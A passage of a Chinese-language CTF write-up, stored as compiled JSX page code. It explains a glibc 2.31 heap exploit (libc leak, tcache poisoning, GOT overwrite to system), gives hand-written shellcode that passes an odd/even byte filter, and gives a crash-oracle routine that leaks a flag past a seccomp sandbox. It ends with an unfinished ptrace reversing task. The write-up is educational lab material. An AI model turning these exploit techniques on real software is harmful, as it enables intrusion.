(int)(char)local_16c,1);\n}\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u91cc\u6f0f\u6d1e\u975e\u5e38\u7ec6\u5fae\uff0c\u5b9e\u9645\u4e0a\u5c31\u662f\u6700\u540e\u8bfb\u53d6\u65f6\uff0c\u628a",(0,s.jsx)(n.code,{children:"local_16c"}),"\u4ece",(0,s.jsx)(n.code,{children:"uint"}),"\u5f3a\u5236\u8f6c\u6362\u4e3a\u4e86",(0,s.jsx)(n.code,{children:"char"}),"\u3002\u8fd9\u6837\u5c31\u5bfc\u81f4\uff0c\u5f53\u8fd9\u4e2a\u5757\uff08\u4e0b\u9762\u79f0\u4e3a\u76ee\u6807\u5757\uff09\u957f\u5ea6\u5927\u4e8e0x100\u65f6\uff0c\u6211\u4eec\u5b9e\u9645\u4e0a\u662f\u5199\u5165",(0,s.jsx)(n.code,{children:"0~0x7f"}),"\u548c",(0,s.jsx)(n.code,{children:"-0x80~0x0"}),"\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u8fd9\u4e2a\u9898\u7684LIBC\u7248\u672c\u662f2.31\uff08Ubuntu20.04\uff09\uff0c\u4fdd\u62a4\u4e0a\u6ca1\u6709PIE\uff0cPartial RELRO\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u4e2a\u4e0b\u6ea2\u548c\u4e0a\u6ea2\u5176\u5b9e\u5404\u81ea\u6709\u529f\u80fd\uff0c\u6211\u4eec\u5206\u5f00\u8bf4\uff1a"}),"\n",(0,s.jsx)(n.h4,{id:"\u9ad8\u5730\u5740\u6ea2\u51faunsorted-bin-consolidate--leak-libc",children:"\u9ad8\u5730\u5740\u6ea2\u51fa\uff1aUnsorted bin Consolidate + leak LIBC"}),"\n",(0,s.jsxs)(n.p,{children:["\u56e0\u4e3a\u4e00\u822c\u7684\u8f93\u5165\u4f1a\u622a\u65ad\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u8fd9\u4e2a\u5199\u5165\u5230\u76ee\u6807\u5757",(0,s.jsx)(n.code,{children:"0x7f"}),"\u504f\u79fb\u662f\u6211\u4eec\u6cc4\u9732\u5806\u5185\u5bb9\u7684\u552f\u4e00\u673a\u4f1a\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u8981\u5728\u76ee\u6807\u5757",(0,s.jsx)(n.code,{children:"0x80"}),"\u7684\u4f4d\u7f6e\u5e03\u7f6eLIBC\u5730\u5740\uff0c\u6bd4\u5982\u8bf4",(0,s.jsx)(n.code,{children:"0x70"}),"\u5904\u653e\u4e00\u4e2aunsortedbin\u5e76\u91ca\u653e\u6389\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u8003\u8651\u5230tcache\u7684\u957f\u5ea6\u4e0a\u9650\u662f",(0,s.jsx)(n.code,{children:"0x410"}),"\uff0c\u6211\u4eec\u53ef\u4ee5\u7533\u8bf7\u4e24\u4e2a",(0,s.jsx)(n.code,{children:"0x420"}),"\u540e\uff08\u518d\u7533\u8bf7\u4e00\u4e2a",(0,s.jsx)(n.code,{children:"0x10"}),"\u5206\u9694top chunk\uff09\uff0c\u5148\u91ca\u653e\u9ad8\u5730\u5740chunk\u8fdb\u5165unsorted bin\uff0c\u7136\u540e\u91ca\u653e\u4f4e\u5730\u5740\uff0c\u89e6\u53d1consolidate\u4e24\u4e2a",(0,s.jsx)(n.code,{children:"chunk"}),"\u5408\u5e76\u4e3a\u4e00\u4e2a",(0,s.jsx)(n.code,{children:"0x840"}),"\uff0c\u4f46\u9ad8\u5730\u5740chunk\u7684\u90a3\u4e2aunsorted bin\u5730\u5740\u4ecd\u7136\u5728\u539f\u6765\u4f4d\u7f6e\u4e0a\uff08\u5e94\u8be5\u662f",(0,s.jsx)(n.code,{children:"0x430"}),"\u5904\uff09\u3002\u4e4b\u540e\u518d\u7533\u8bf7\u5806\u5757\u65f6\uff0c\u5047\u5982tcache\u6ca1\u6709\u5c31\u4f1a\u4ece\u8fd9\u4e2a",(0,s.jsx)(n.code,{children:"0x840"}),"\u91cc\u9762\u5207\uff0c\u6211\u4eec\u53ea\u9700\u8981\u4fdd\u8bc1\u5207\u8d70",(0,s.jsx)(n.code,{children:"0x3a0"}),"\u5927\u5c0f\u7684\u5806\u5757\u540e\uff0c\u518d\u7533\u8bf7\u65b0\u5806\u5757\u65f6\uff0c\u90a3\u4e2a\u5730\u5740\u5c31\u4f1a\u5728",(0,s.jsx)(n.code,{children:"0x90"}),"\u5904\uff0c\u53bb\u6389chunk\u5934\u521a\u597d\u5c31\u662f0x80\u3002"]}),"\n",(0,s.jsx)(n.h4,{id:"\u4f4e\u5730\u5740\u6ea2\u51fachunk-extend--tcache-poisoning",children:"\u4f4e\u5730\u5740\u6ea2\u51fa\uff1aChunk Extend + Tcache Poisoning"}),"\n",(0,s.jsxs)(n.p,{children:["\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u8981\u5145\u5206\u5229\u7528\u4f4e\u5730\u5740\u7684\u6ea2\u51fa\uff0c\u8003\u8651\u5230\u6ea2\u51fa\u8303\u56f4\u6709",(0,s.jsx)(n.code,{children:"0x80"}),"\u90a3\u4e48\u5927\uff0c\u9664\u4e86\u81ea\u5df1\u7684chunk\u5934\u8fd8\u80fd\u6ea2\u51fa0x70\u5b57\u8282\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5728\u76ee\u6807\u5757\u7684\u4f4e\u5730\u5740\u7533\u8bf7\u51e0\u4e2a\u5c0f\u7684\u5806\u5757\uff08\u6211\u7528\u7684\u662f0x30, 0x20, 0x20\uff09\uff0c\u5728\u6ea2\u51fa\u8fc7\u7a0b\u4e2d\u4fee\u6539\u5176\u4e2d\u6700\u4f4e\u7684\u4e00\u4e2a\u5806\u5757\u7684\u5927\u5c0f\uff0c\u4f7f\u5176\u4e0e\u540e\u9762\u4e24\u4e2a\u5c0f\u5806\u5757\u91cd\u53e0\uff0c\u8fbe\u6210\u4e24\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5185\u5b58\u7684\u60c5\u51b5\uff0c\u4fbf\u4e8eUAF\u3002\u6ce8\u610f\u4fee\u6539chunk\u5934\u540e\u9700\u8981\u91ca\u653e\u6389\u518d\u7533\u8bf7\u56de\u6765\uff080x70\u5927\u5c0f\uff09\uff0c\u8fd9\u6837\u80fd\u91cd\u7f6e\u7a0b\u5e8f\u91cc\uff08\u800c\u975eptmalloc\uff09\u8bb0\u5f55\u7684\u5927\u5c0f\u5b57\u6bb5\uff0c\u624d\u80fd\u771f\u6b63\u8986\u76d6\u5230\u540e\u4e24\u4e2a\u5806\u5757\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u4e4b\u540e\u7684\u6d41\u7a0b\u53ef\u4ee5\u53c2\u8003how2heap\u91cc\u7684",(0,s.jsx)(n.a,{href:"https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c",children:"tcache poisoning"}),"\uff0c\u628a\u4e24\u4e2a",(0,s.jsx)(n.code,{children:"0x20"}),"\u5806\u5757\u91ca\u653e\u540e\u4f1a\u8fdb\u5165tcache\u3002\u5982\u679c\u628a",(0,s.jsx)(n.code,{children:"next"}),"\u5b57\u6bb5\u6539\u6210GOT\u8868\uff0c\u7ecf\u5386\u4e24\u6b21\u7533\u8bf7\u540etcache\u5c31\u4f1a\u7533\u8bf7\u5230GOT\u8868\u4f4d\u7f6e\u7684\u5806\u5757\u3002\u6211\u4eec\u53ef\u4ee5\u628aGOT\u7684free\u6539\u6210",(0,s.jsx)(n.code,{children:"system"}),"\uff0c\u4e4b\u540efree\u6389\u5305\u542b",(0,s.jsx)(n.code,{children:"/bin/sh"}),"\u7684\u5806\u5757\u5c31\u53ef\u4ee5getshell\u3002\u6211\u6bd4\u8f83\u559c\u6b22\u628a\u6700\u5f00\u59cb\u90a3\u4e2a\u5206\u9694top chunk\u7528\u7684chunk\u5199\u6210",(0,s.jsx)(n.code,{children:"/bin/sh"}),"\uff0c\u9887\u6709\u72e1\u5154\u6b7b\u8d70\u72d7\u70f9\u7684\u90a3\u79cd\u611f\u89c9\u3002"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"flag{learning_deflat_trick_to_defeat_ollvm}"})}),"\n",(0,s.jsx)(n.h2,{id:"pwn-shellcode",children:"pwn-shellcode"}),"\n",(0,s.jsx)(n.p,{children:"\u6709\u8da3\u4f46\u6298\u78e8\u7684shellcode\u9898\u3002\u7a0b\u5e8f\u8bfb\u5165\u4e00\u6bb5shellcode\uff0c\u4f1a\u5bf9shellcode\u505a\u4e00\u4e2a\u5f88\u79bb\u8c31\u7684\u68c0\u67e5\uff0c\u7136\u540e\u5728seccomp\u6c99\u7bb1\u91cc\u6267\u884c\uff08\u53ea\u5141\u8bb8open\u548cread\uff09\u3002\u53ef\u4ee5\u5206\u4e3a\u4e24\u4e2a\u9636\u6bb5\u3002"}),"\n",(0,s.jsx)(n.h4,{id:"1-bypass-odd-even-check",children:"1. bypass odd-even check"}),"\n",(0,s.jsx)(n.p,{children:"\u8fd9\u4e2a\u68c0\u67e5\u5176\u5b9e\u662f\u6700\u96be\u7684\u4e00\u90e8\u5206\u3002\u68c0\u67e5\u90e8\u5206\u4ee3\u7801\uff1a"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"  sVar1 = read(0,__buf,0x200);\n  local_18 = 0;\n  while( true ) {\n    if ((int)sVar1 <= local_18) {\n      (*__buf)();\n      return 0;\n    }\n    if ((int)((char)__buf[local_18] % '\\x02') != local_18 % 2) break;\n    local_18 = local_18 + 1;\n  }\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4e5f\u5c31\u662f\u8bf4\uff1ashellcode\u9700\u8981\u5076\u6570\u5b57\u8282\u662f\u5076\u6570\uff0c\u5947\u6570\u5b57\u8282\u662f\u5c0f\u4e8e128\u7684\u5947\u6570\uff08\u5927\u4e8e128\u4f1a\u5f97\u5230-1\uff09\uff0c\u8fd9\u4e2a\u9650\u5236\u5bfc\u81f4\u6211\u4eec\u6839\u672c\u6ca1\u6cd5\u597d\u597d\u5199shellcode\uff0c\u4e0d\u8fc7\u7ecf\u8fc7\u8c03\u8bd5\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5\u6b64\u65f6rax\uff0crsi, \u90fd\u6307\u5411shellcode\u8d77\u59cb\u4f4d\u7f6e\uff08\u6808\u9876\uff09\uff0crdi\u4e3a0\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:" RAX  0x7fc8a7859000 \u25c2\u2014 xor byte ptr [rcx], dh /* 0x31303130; '0101' */\n RBX  0x0\n RCX  0x1\n RDX  0x0\n RDI  0x0\n RSI  0x7fc8a7859000 \u25c2\u2014 xor byte ptr [rcx], dh /* 0x31303130; '0101' */\n R8   0x55c0c9bb6b10 \u25c2\u2014 0x55c595b7f7a6\n R9   0x55c0c9bb6b10 \u25c2\u2014 0x55c595b7f7a6\n R10  0x1\n R11  0x246\n R12  0x7fff2b577cb8 \u2014\u25b8 0x7fff2b578df7 \u25c2\u2014 './shellcode'\n R13  0x55c0c7c43313 \u25c2\u2014 endbr64\n R14  0x0\n R15  0x7fc8a785c040 (_rtld_global) \u2014\u25b8 0x7fc8a785d2e0 \u2014\u25b8 0x55c0c7c42000 \u25c2\u2014 0x10102464c457f\n RBP  0x7fff2b577ba0 \u25c2\u2014 0x1\n*RSP  0x7fff2b577b88 \u2014\u25b8 0x55c0c7c433d7 \u25c2\u2014 mov eax, 0\n*RIP  0x7fc8a7859000 \u25c2\u2014 xor byte ptr [rcx], dh /* 0x31303130; '0101' */\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6240\u4ee5\u6211\u4eec\u7b2c\u4e00\u9636\u6bb5\u76ee\u6807\u662f\u91cd\u65b0\u8c03\u7528\u4e00\u6b21read\uff0c\u4ee5\u5728\u6ca1\u6709\u9650\u5236\u7684\u60c5\u51b5\u4e0b\u5bfc\u5165\u65b0\u7684shellcode\u3002\u8fd9\u9700\u8981\uff1a"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"RAX=0"}),"\n",(0,s.jsx)(n.li,{children:"RDX=\u975e\u96f6\u503c\uff0c\u6700\u597d\u5927\u4e8e0x100\u5c0f\u4e8e0x1000\uff08\u9632\u6b62\u8d8a\u754c\u5199\u62a5SIGSEGV\u6216\u8005read\u4e0d\u6210\u529f\uff09"}),"\n",(0,s.jsx)(n.li,{children:"\u8c03\u7528syscall"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u7ecf\u8fc7\u4e00\u4e9b\u5c1d\u8bd5\uff0c\u6211\u4eec\u53d1\u73b0\u5728\u4e00\u4e9b\u6c47\u7f16\u6307\u4ee4\u4e0a\u8fdb\u884c\u5fae\u8c03\uff08\u6539\u53d8\u67d0\u4e9b\u4f4d\u7684\u503c\uff09\u53ef\u80fd\u5f97\u5230\u4e0e\u539f\u6765\u8bed\u53e5\u529f\u80fd\u7c7b\u4f3c\u7684\u6307\u4ee4\u3002\u4e3b\u8981\u7684\u53d1\u73b0\uff1a"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u6307\u4ee4\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u901a\u5e38\u5b9a\u4e49\u4e86\u64cd\u4f5c\u7c7b\u578b\uff08add, xor, sub\u7b49\uff09\uff0c\u7b2c\u4e8c\u4e2a\u5b57\u8282\u7684\u6700\u540e\u4e00\u4e2ahex\u4f1a\u51b3\u5b9a\u7b2c\u4e00\u4e2a\u88ab\u64cd\u4f5c\u7684\u5bc4\u5b58\u5668\u3002\u8003\u8651\u5230\u5947\u5076\u6027\uff0c\u6bd4\u5982\u901a\u5e38rax, rdx\u662f\u5076\u6570\uff0crsi, rbx\u662f\u5947\u6570\u3002\u540e\u9762\u7684\u901a\u5e38\u4f1a\u662f\u64cd\u4f5c\u6570\u3002"}),"\n",(0,s.jsxs)(n.li,{children:["\u5e38\u7528\u4e8e\u51fd\u6570\u8c03\u7528\u7684\u5bc4\u5b58\u5668\uff0c\u5982rdi, rdx, rsi, rax\u7b49\uff0c\u5176push/pop\u6307\u4ee4\u901a\u5e38\u5f88\u77ed\uff0c\u53ea\u6709\u4e00\u4e2a\u5b57\u8282\uff0c\u53ef\u4ee5\u7528\u6765\u5947\u6570\u7ec4\u548c\u5076\u6570\u7ec4\u5bc4\u5b58\u5668\u4ea4\u6362\u6570\u636e\uff0c\u6bd4\u5982",(0,s.jsx)(n.code,{children:"50 5b"}),"\u7b49\u6548\u4e8e",(0,s.jsx)(n.code,{children:"push rax; pop rbx"}),"\uff0c\u5c31\u628a\u6808\u5730\u5740\u4ea4\u7ed9",(0,s.jsx)(n.code,{children:"rbx"})]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"80 43 0c 01"}),"\u7b49\u6548\u4e8e",(0,s.jsx)(n.code,{children:"add BYTE PTR [rbx+0xc], 0x1"}),"\u3002\u8fd9\u4e2a\u662f\u975e\u5e38\u6709\u7528\u7684gadget\uff0c\u53ef\u4ee5\u5c06shellcode\u67d0\u4e2a\u4f4d\u4e8e\u5076\u6570\u4f4d\u7f6e\u7684\u5b57\u8282\u53d8\u4e3a\u5947\u6570\uff08\u7279\u522b\u662f\u8fd9\u4e2a\u6570\u53ef\u4ee5\u5927\u4e8e128\uff09\u3002\u5370\u8c61\u4e2d\u6709\u4e00\u4e2a\u7c7b\u4f3c\u7684gadget",(0,s.jsx)(n.code,{children:"add DWORD PTR [rax+0xb], 0x2"}),"\u53ef\u4ee5\u628a\u5947\u6570\u4f4d\u7f6e\u7684\u5b57\u8282\u53d8\u4e3a\u5927\u4e8e128\u7684\u503c\uff0c\u4f46\u662f\u4e0d\u5982\u8fd9\u4e2a\u6709\u7528\u3002"]}),"\n",(0,s.jsxs)(n.li,{children:["\u7b49\u6548NOP\u6307\u4ee4\uff1a\u8fd9\u4e2a\u9898\u91ccNOP\u6307\u4ee4\u7528\u4e8e\u586b\u5145\u8c03\u6574\u5947\u5076\u4f4d\uff0c\u8d77\u5230\u91cd\u8981\u7684\u8f85\u52a9\u4f5c\u7528\u3002\u6b63\u5e38\u7684",(0,s.jsx)(n.code,{children:"\\x90"}),"\u53ef\u4ee5\u7528\u4e8e\u5947\u6570\u4f4d\u548c\u5947\u6570\u4f4d\u3002\u4f46\u5bf9\u4e8e\u521a\u521a\u4e94\u5b57\u8282\u7684gadget\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u8fde\u63a5\u5076\u5b57\u8282\u548c\u5076\u5b57\u8282\u7684gadget\u3002\u4e00\u756a\u904d\u5386\u540e\uff0c\u6211\u627e\u5230\u4e86",(0,s.jsx)(n.code,{children:"xor BYTE PTR [r9], al"})," == ",(0,s.jsx)(n.code,{children:"41 30 01"}),"\uff0c\u56e0\u4e3aR9\u5728\u8c03\u8bd5\u4e2d\u662f\u4e00\u4e2a\u53ef\u5199\u7684\u5730\u5740\uff0c\u5e76\u4e14\u6211\u4eec\u5728\u8fd9\u4e2a\u9636\u6bb5\u4e0d\u4f1a\u7528\u5230R9\u3002"]}),"\n",(0,s.jsxs)(n.li,{children:["\u5173\u4e8erdx\u7684\u53d6\u503c\uff1a\u6211\u4eec\u6ce8\u610f\u5230R11\u5bc4\u5b58\u5668\u7684\u503c\u662f",(0,s.jsx)(n.code,{children:"0x246"}),"\uff0c\u975e\u5e38\u5408\u9002\u3002",(0,s.jsx)(n.code,{children:"push r11; pop rdx"}),"==",(0,s.jsx)(n.code,{children:"41 53 5a"}),"\uff0c\u9664\u4e86\u7b2c\u4e00\u4e2a\u662f\u5947\u6570\u5916\u90fd\u5f88\u5b8c\u7f8e\uff0c\u800c\u6211\u4eec\u6b64\u65f6\u5df2\u7ecf\u83b7\u5f97\u4e86\u4fee\u6539\u5076\u6570\u4f4d\u7f6e\u5b57\u8282\u4f4d\u5947\u6570\u7684\u80fd\u529b\u3002"]}),"\n",(0,s.jsxs)(n.li,{children:["\u5173\u4e8esyscall\uff1a\u540c\u7406\uff0csyscall\u4e3a",(0,s.jsx)(n.code,{children:"0f 05"}),"\uff0c\u9700\u8981\u6539\u6389\u7b2c\u4e00\u4e2a\u5b57\u8282\u3002"]}),"\n",(0,s.jsxs)(n.li,{children:["\u7ed3\u5c3e\u7684\u7ec6\u8282\uff1a\u9996\u5148",(0,s.jsx)(n.code,{children:"syscall"}),"\u540e\u9700\u8981\u662f\u4e00\u4e2aNOP\uff08",(0,s.jsx)(n.code,{children:"90"}),"\uff09\uff0c\u56e0\u4e3a\u6267\u884csyscall\u7684\u65f6\u5019CPU\u5df2\u7ecf\u53d6\u5230\u4e86\u4e0b\u4e00\u4e2a\u6307\u4ee4\uff0c\u6211\u4eec\u5fc5\u987b\u8981\u4fdd\u8bc1\u8fd9\u4e2a\u6307\u4ee4\u5408\u6cd5\uff0c\u540e\u9762\u7684\u5c31\u662fread\u540e\u7684\u65b0shellcode\u4e86\u3002\u5176\u6b21\uff0c\u56e0\u4e3aread\u8f93\u5165\u7684\u7ed3\u5c3e\u4f1a\u52a0\u4e00\u4e2a\u6362\u884c",(0,s.jsx)(n.code,{children:"0a"}),"\uff0c\u6240\u4ee5",(0,s.jsx)(n.code,{children:"90"}),"\u540e\u8fd8\u8981\u8865\u4e00\u4e2a\u4efb\u610f\u5408\u6cd5\u5947\u6570\u3002"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u6700\u7ec8shellcode (\u8003\u8651SMC\u4fee\u6b63\u540e):"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"   0:   50                      push   rax\n   1:   5b                      pop    rbx\n   2:   48 31 c0                xor    rax, rax\n   5:   41 30 01                xor    BYTE PTR [r9], al\n   8:   80 43 0c 01             add    BYTE PTR [rbx+0xc], 0x1\n   c:   41 53                   push   r11\n   e:   5a                      pop    rdx\n   f:   41 30 01                xor    BYTE PTR [r9], al\n  12:   80 43 16 01             add    BYTE PTR [rbx+0x16], 0x1\n  16:   0f 05                   syscall \n  18:   90                      nop\n"})}),"\n",(0,s.jsx)(n.h4,{id:"2-bypass-seccomp",children:"2. bypass seccomp"}),"\n",(0,s.jsxs)(n.p,{children:["\u5148\u7528",(0,s.jsx)(n.code,{children:"seccomp-tools"}),"\u5bfc\u51fa\u6c99\u7bb1\u89c4\u5219\uff1a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:" line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005\n 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008\n 0005: 0x15 0x01 0x00 0x00000000  if (A == read) goto 0007\n 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008\n 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0008: 0x06 0x00 0x00 0x00000000  return KILL\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u770b\u5230\u53ea\u80fd\u7528open\u548cread\u4e24\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u6211\u4eec\u6ca1\u529e\u6cd5\u8f93\u51fa\u4e86\u3002\u6211\u4eec\u552f\u4e00\u7684\u8f93\u51fa\u5c31\u662f\u53ef\u4ee5\u8ba9\u7a0b\u5e8fcrash\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u7a0b\u5e8f\uff0c\u5224\u65ad\u7b2ci\u4e2a\u5b57\u7b26\u662f\u4e0d\u662f\u6211\u4eec\u7684\u8f93\u5165\uff0c\u5982\u679c\u662f\u5c31crash\uff0c\u7136\u540e\u6211\u4eec\u904d\u5386ASCII\u5b57\u7b26\u76f4\u5230\u627e\u5230\u8ba9\u7a0b\u5e8fcrash\u7684\u90a3\u4e2a\u5b57\u7b26\uff0c\u5c31\u80fd\u6cc4\u9732\u51fa\u4e00\u4e2a\u5b57\u8282\u3002\u5b9e\u9645\u64cd\u4f5c\u4e2d\uff0c\u6211\u4eec\u7684\u8f93\u5165\u4e0d\u80fd\u592a\u5feb\uff0c\u5426\u5219\u4f1a\u51fa\u73b0\u6211\u4eec\u8fd8\u6ca1\u77e5\u9053\u7a0b\u5e8fcrash\uff0c\u5c31\u5df2\u7ecf\u53d1\u9001\u4e86\u597d\u51e0\u4e2a\u5b57\u7b26\u7684\u60c5\u51b5\u3002\u6211\u7684\u6d4b\u8bd5\u4e2d\uff0c\u53d1\u9001\u5b57\u7b26\u95f4\u9694\u4e3a0.2\u79d2\u65f6\uff0c\u7a0b\u5e8fcrash\u7684\u65f6\u95f4\u4f1a\u7a33\u5b9a\u9886\u51481\u4e2a\u5b57\u7b26\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'// we already input "flag\\0" at RSI, now we open it\nmov rax, 2\nmov r10, rsi\nmov rdi, rsi\nxor rsi, rsi\nxor rdx, rdx\nsyscall\n// read flag content\nlea rsi, [r10 + 0x400]\nmov rdi, rax\nxor rax, rax\nmov rdx, 0x100\nsyscall\n// read i-th character into r8b\n// we also want to crash directly if this is null-byte\nmov r8b, byte ptr [r10 + {0x400 + i}]\ncmp r8b, 0\njz end\n// loop reading from stdin until equal\nloop:\nlea rsi, [r10 + 0x800]\nmov rdi, 0\nxor rax, rax\nmov rdx, 0x1\nsyscall\n\nmov r9b, byte ptr [r10 + 0x800]\ncmp r8b, r9b\njnz loop\n// crash\nend:\nhlt\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"flag{practice_handwrite_shellcode}"})}),"\n",(0,s.jsx)(n.p,{children:"\u4e0d\u592a\u6e05\u695a\u5df2\u7ecf\u5728\u6c99\u7bb1\u91cc\u7684\u60c5\u51b5\u4e0b\uff0c\u91cd\u65b0\u8c03\u7528prctl\u6216\u8005seccomp\u76f8\u5173\u51fd\u6570\u80fd\u4e0d\u80fd\u53d6\u6d88\u6c99\u7bb1\uff08\u6211\u89c9\u5f97\u5e94\u8be5\u4e0d\u80fd\uff0c\u4e0d\u7136\u8fd9\u6c99\u7bb1\u4e0d\u662f\u6ca1\u4ec0\u4e48\u7528\u4e86\uff09"}),"\n",(0,s.jsx)(n.h2,{id:"rev---peertrace\u672a\u505a\u51fa",children:"rev - peertrace\uff08\u672a\u505a\u51fa\uff09"}),"\n",(0,s.jsxs)(n.p,{children:["\u7b2c\u4e00\u6b21\u89c1\u7528ptrace\u7684\u7a0b\u5e8f\uff0c\u8fd9\u4e2a\u9898\u7ed9\u4e86\u4e24\u4e2a\u7a0b\u5e8f\uff0cpeer\u7528fork\u751f\u6210\u5b50\u8fdb\u7a0b\uff0c\u5b50\u8fdb\u7a0b\u8c03\u7528",(0,s.jsx)(n.code,{children:"PTRACE_TRACEME"}),"\u540eexecve\u4e86\u53e6\u4e00\u4e2a\u7a0b\u5e8fpuppet\uff0c\u7136\u540e\u6267\u884c\u3002puppet\u903b\u8f91\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u548c0x28\u8fdb\u884cxor\u540e\u4e0e\u5b57\u7b26\u4e32\u6bd4\u8f83\uff0c\u4f46\u5b9e\u9645\u4e0apeer\u4f1a\u65ad\u70b9\u4fee\u6539\u8f93\u5165\uff0c\u6240\u4ee5\u8fd8\u662f\u6bd4\u8f83\u590d\u6742\u7684\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u56e0\u4e3a",(0,s.jsx)(n.code,{children:"tracer"}),"\u672c\u8eab\u8fd8\u662f\u53ef\u4ee5GDB\u8c03\u8bd5\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4ec0\u4e48\u65f6\u5019",(0,s.jsx)(n.code,{children:"tracer"}),"\u5bf9",(0,s.jsx)(n.code,{children:"tracee"}),"\u8fdb\u884c\u4e86\u4fee\u6539\uff08\u7279\u5f81\u5f88\u660e\u663e\uff0c\u65e0\u975e\u5c31\u662f\u5f53\u67d0\u4e9b\u5bc4\u5b58\u5668\u6ee1\u8db3\u67d0\u79cd\u6761\u4ef6\u662f\u4f1a\u505a\u67d0\u79cd\u64cd\u4f5c\uff09\u3002\u4e3b\u8981\u5206\u4e3a\u4e24\u4e2a\u9636\u6bb5\uff0c\u5012\u7740\u8bf4\uff1a"]}),"\n",(0,s.jsx)(n.p,{children:"\u7b2c\u4e8c\u9636\u6bb5\u53d1\u751f\u5728\u5f02\u6216\u65f6\uff0c\u6bcf\u4e2a\u5b57\u7b26\u5f02\u6216\u90fd\u4f1a\u4e0b\u4e2a\u65ad\u70b9\uff0c\u548c\u67d0\u4e2a\u5b57\u7b26\u4e32\u7684\u5bf9\u5e94\u5b57\u7b26\u8fdb\u884c\u52a0\u51cf\u8fd0\u7b97\u3002\u8fd9\u4e2a\u6bd4\u8f83\u597d\u9006\u5411\uff0c\u53ea\u662f\u4e0d\u77e5\u9053\u5f02\u6216\u548c\u52a0\u51cf\u54ea\u4e2a\u524d\u54ea\u4e2a\u540e\uff0c\u53ef\u4ee5\u90fd\u8bd5\u8bd5\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u7b2c\u4e00\u9636\u6bb5\u5219\u53d1\u751f\u5728\u521a\u8f93\u5165\u4e4b\u540e\uff0c\u4f1a\u5bf9\u8f93\u5165\u76840x30\u4e2a\u5b57\u8282\u6bcf8\u4e2a\u5b57\u8282\u4e3a\u5355\u4f4d\u8fdb\u884c\u4e00\u4e9b\u5bf9\u6362\u548c\u52a0\u51cf\u3002\u8fd9\u90e8\u5206\u6709\u6bb5\u975e\u5e38\u96be\u770b\u61c2\u7684\u6c47\u7f16\uff0c\u76f4\u63a5\u628aghidra\u53cd\u7f16\u8bd1\u5668\u6574\u4e0d\u4f1a\u4e86\uff0c\u6240\u4ee5\u8fd9\u90e8\u5206\u6211\u9006\u5411\u4ee3\u7801\u5e94\u8be5\u662f\u5199\u9519\u4e86\uff0c\u6ca1\u5f97\u5230\u7ed3\u679c\u3002\u73b0\u5728\u60f3\u60f3\u8fd9\u90e8\u5206\u5e94\u8be5\u76f4\u63a5angr\uff0c\u8fd9\u4e2a\u96be\u5ea6\u7684\u52a0\u5bc6ANGR\u7edd\u5bf9\u662f\u53ef\u4ee5\u8dd1\u51fa\u6765\u7684\uff0c\u53ea\u662f\u6211\u6709\u70b9\u61d2\u5f97\u5199\u4e86\u3002"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"001013c0 48 89 c2        MOV        RDX,uVar6[0]\n001013c3 48 8d 45 c0     LEA        uVar6[0]=>local_48,[RBP + -0x40]\n001013c7 48 89 10        MOV        qword ptr [uVar6[0]]=>local_48,RDX\n001013ca 0f b6 45 c0     MOVZX      uVar6[0]=>local_48,byte ptr [RBP + -0x40]\n001013ce 0f b6 c0        MOVZX      uVar6[0],uVar6[0]\n001013d1 48 89 85        MOV        qword ptr [RBP + local_160],uVar6[0]\n            a8 fe ff ff\n001013d8 0f b6 45 c5     MOVZX      uVar6[0],byte ptr [RBP + local_48[5]]\n001013dc 88 45 c0        MOV        byte ptr [RBP + local_48[0]],uVar6[0]\n001013df 48 8b 85        